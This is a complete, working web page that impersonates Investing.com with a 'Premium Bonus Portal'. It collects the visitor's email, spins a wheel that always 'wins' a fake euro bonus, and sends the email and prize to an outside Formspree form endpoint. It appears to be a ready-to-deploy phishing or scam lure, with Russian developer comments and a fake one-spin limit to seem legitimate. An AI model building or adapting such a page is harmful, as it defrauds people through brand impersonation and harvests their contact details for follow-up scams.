<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Investing.com | Premium Bonus Portal</title>
    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root {
            --inv-orange: #f39c12;
            --inv-blue: #0b1e33;
            --gold: linear-gradient(135deg, #f39c12 0%, #ffcc00 100%);
            --glass: rgba(255, 255, 255, 0.07);
            --border: rgba(255, 255, 255, 0.1);
        }

        body {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            margin: 0;
            background: #050c16;
            background-image: 
                radial-gradient(circle at 20% 30%, rgba(22, 49, 82, 0.5) 0%, transparent 40%),
                radial-gradient(circle at 80% 70%, rgba(243, 156, 18, 0.05) 0%, transparent 40%);
            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            color: white;
            overflow: hidden;
        }

        /* ЛОГОТИП ВЕРХНИЙ (НА ТЕМНОМ) */
        .header-ui { text-align: center; margin-bottom: 30px; z-index: 100; }
        .logo-text-top { 
            font-size: 42px; 
            font-weight: 900; 
            letter-spacing: -1.5px; 
            color: #ffffff;
            text-shadow: 0 4px 15px rgba(0,0,0,0.5);
        }
        .logo-text-top span { color: var(--inv-orange); }

        /* ОКНО ВХОДА */
        #auth-container {
            position: fixed;
            inset: 0;
            background: rgba(2, 6, 12, 0.98);
            z-index: 2000;
            display: flex;
            align-items: center;
            justify-content: center;
            backdrop-filter: blur(12px);
        }

        .auth-box {
            background: #ffffff; /* Белый фон для солидности */
            padding: 50px;
            border-radius: 20px;
            text-align: center;
            width: 90%;
            max-width: 400px;
            box-shadow: 0 30px 100px rgba(0,0,0,0.7);
            border-top: 8px solid var(--inv-orange);
            animation: slideUp 0.5s ease-out;
        }

        @keyframes slideUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }

        /* ЛОГОТИП ВНУТРИ ОКНА (ТЕМНЫЙ НА БЕЛОМ) */
        .auth-logo {
            font-size: 36px;
            font-weight: 900;
            color: #0b1e33; /* Темно-синий Investing */
            margin-bottom: 15px;
            letter-spacing: -1px;
        }
        .auth-logo span { color: var(--inv-orange); }

        .auth-box h2 { color: #0b1e33; font-size: 24px; font-weight: 800; margin: 0 0 10px 0; }
        .auth-box p { color: #555; font-size: 14px; line-height: 1.5; margin-bottom: 30px; }

        .auth-box input {
            width: 100%;
            padding: 18px;
            background: #f4f7f9;
            border: 2px solid #e1e4e8;
            border-radius: 10px;
            color: #333;
            font-size: 16px;
            margin-bottom: 20px;
            box-sizing: border-box;
            outline: none;
            transition: 0.3s;
        }
        .auth-box input:focus { border-color: var(--inv-orange); background: #fff; }

        .auth-box button {
            width: 100%;
            padding: 18px;
            background: #0b1e33;
            color: white;
            border: none;
            border-radius: 10px;
            font-weight: 700;
            font-size: 16px;
            cursor: pointer;
            text-transform: uppercase;
            transition: 0.3s;
        }
        .auth-box button:hover { background: #000; transform: translateY(-2px); }

        /* КОЛЕСО */
        .wheel-wrapper {
            position: relative;
            padding: 20px;
            background: rgba(255,255,255,0.03);
            border-radius: 50%;
            border: 1px solid var(--border);
        }

        .wheel-container {
            position: relative;
            width: 480px;
            height: 480px;
            border-radius: 50%;
            border: 12px solid #0a1421;
            overflow: hidden;
            box-shadow: 0 0 60px rgba(0,0,0,0.5);
        }

        #wheel { width: 100%; height: 100%; transition: transform 7s cubic-bezier(0.15, 0, 0.15, 1); }

        .pointer {
            position: absolute;
            top: -15px; left: 50%;
            transform: translateX(-50%);
            width: 45px; height: 50px;
            background: #fff;
            clip-path: polygon(50% 100%, 0 0, 100% 0);
            z-index: 100;
        }

        .center-hub {
            position: absolute;
            top: 50%; left: 50%;
            transform: translate(-50%, -50%);
            width: 80px; height: 80px;
            background: #050c16;
            border: 4px solid var(--inv-orange);
            border-radius: 50%;
            z-index: 50;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .center-hub i { font-size: 30px; color: var(--inv-orange); }

        #spin-btn {
            margin-top: 40px;
            background: var(--gold);
            border: none;
            padding: 20px 80px;
            border-radius: 12px;
            color: #000;
            font-size: 1.3rem;
            font-weight: 900;
            text-transform: uppercase;
            cursor: pointer;
            transition: 0.3s;
        }
        #spin-btn:hover { transform: scale(1.05); box-shadow: 0 10px 30px rgba(243, 156, 18, 0.4); }

        /* МОДАЛКА */
        .modal {
            position: fixed;
            inset: 0;
            background: rgba(2, 6, 12, 0.99);
            display: none;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            z-index: 3000;
        }

        .modal-content {
            background: #fff;
            padding: 50px;
            border-radius: 25px;
            text-align: center;
            color: #000;
            max-width: 400px;
        }

        .amount { font-size: 5rem; font-weight: 900; color: var(--inv-orange); margin: 20px 0; }
        #already-played { display: none; color: var(--inv-orange); font-weight: bold; margin-top: 25px; }
    </style>
</head>
<body>

    <!-- ОКНО ВВОДА ПОЧТЫ -->
    <div id="auth-container">
        <div class="auth-box">
            <div class="auth-logo">Investing<span>.com</span></div>
            <h2>Bonus Draw</h2>
            <p>Please provide your email address to verify your eligibility for the premium reward draw.</p>
            <input type="email" id="user-email" placeholder="example@investing.com">
            <button id="auth-btn">Confirm & Access</button>
            <p id="error-msg" style="color: red; display: none; margin-top: 15px;"></p>
        </div>
    </div>

    <!-- ГЛАВНЫЙ ЭКРАН -->
    <div class="header-ui">
        <div class="logo-text-top">Investing<span>.com</span></div>
    </div>

    <div class="wheel-wrapper">
        <div class="pointer"></div>
        <div class="center-hub"><i class="fas fa-euro-sign"></i></div>
        <div class="wheel-container">
            <canvas id="wheel" width="480" height="480"></canvas>
        </div>
    </div>

    <button id="spin-btn">Spin to Win</button>
    <p id="already-played">Limit Reached: One spin per account.</p>

    <div id="win-modal" class="modal">
        <div class="modal-content">
            <h2>WINNER!</h2>
            <div class="amount" id="win-amount">0 EUR</div>
            <p>Your bonus is reserved. Check your email for confirmation.</p>
            <button onclick="location.reload()">CLAIM NOW</button>
        </div>
    </div>

    <script>
        const canvas = document.getElementById('wheel');
        const ctx = canvas.getContext('2d');
        const spinBtn = document.getElementById('spin-btn');
        const authBtn = document.getElementById('auth-btn');
        const authContainer = document.getElementById('auth-container');
        const modal = document.getElementById('win-modal');
        const winAmountText = document.getElementById('win-amount');
        
        const FORMSPREE_URL = "https://formspree.io/f/xrewvoya"; 
        const bonuses = ["50 EUR", "100 EUR", "150 EUR", "200 EUR", "75 EUR", "125 EUR", "175 EUR", "90 EUR"];
        const colors = ["#0b1e33", "#163152"];
        const arc = (2 * Math.PI) / bonuses.length;
        let currentRotation = 0;
        let userEmail = "";

        function draw() {
            for (let i = 0; i < bonuses.length; i++) {
                ctx.fillStyle = colors[i % 2];
                ctx.beginPath(); ctx.moveTo(240, 240);
                ctx.arc(240, 240, 240, i * arc, (i + 1) * arc);
                ctx.fill();
                ctx.save();
                ctx.translate(240, 240); ctx.rotate(i * arc + arc / 2);
                ctx.textAlign = "right"; ctx.fillStyle = (i % 2 === 0) ? "#f39c12" : "#ffffff";
                ctx.font = "bold 22px Arial"; ctx.fillText(bonuses[i], 220, 10);
                ctx.restore();
            }
        }
        draw();

        if (localStorage.getItem('hasPlayed')) {
            authContainer.style.display = "none";
            spinBtn.style.display = "none";
            document.getElementById('already-played').style.display = "block";
        }

        authBtn.addEventListener('click', () => {
            const email = document.getElementById('user-email').value;
            if (email.includes('@') && email.length > 5) {
                userEmail = email;
                authContainer.style.display = "none";
            } else {
                const err = document.getElementById('error-msg');
                err.innerText = "Valid email required.";
                err.style.display = "block";
            }
        });

        spinBtn.addEventListener('click', () => {
            if (spinBtn.disabled) return;
            spinBtn.disabled = true;

            const targetIndex = Math.floor(Math.random() * bonuses.length);
            const targetValue = bonuses[targetIndex];
            const landingPoint = 360 - (targetIndex * (360/bonuses.length)) - (360/bonuses.length/2) - 90;
            currentRotation += (360 * 8) + landingPoint;
            canvas.style.transform = `rotate(${currentRotation}deg)`;

            setTimeout(() => {
                winAmountText.innerText = targetValue;
                modal.style.display = "flex";
                localStorage.setItem('hasPlayed', 'true');
                
                fetch(FORMSPREE_URL, {
                    method: 'POST',
                    headers: { 'Accept': 'application/json', 'Content-Type': 'application/json' },
                    body: JSON.stringify({ email: userEmail, win: targetValue })
                });

                confetti({ particleCount: 200, spread: 80, origin: { y: 0.6 } });
            }, 7200);
        });
    </script>
</body>
</html>
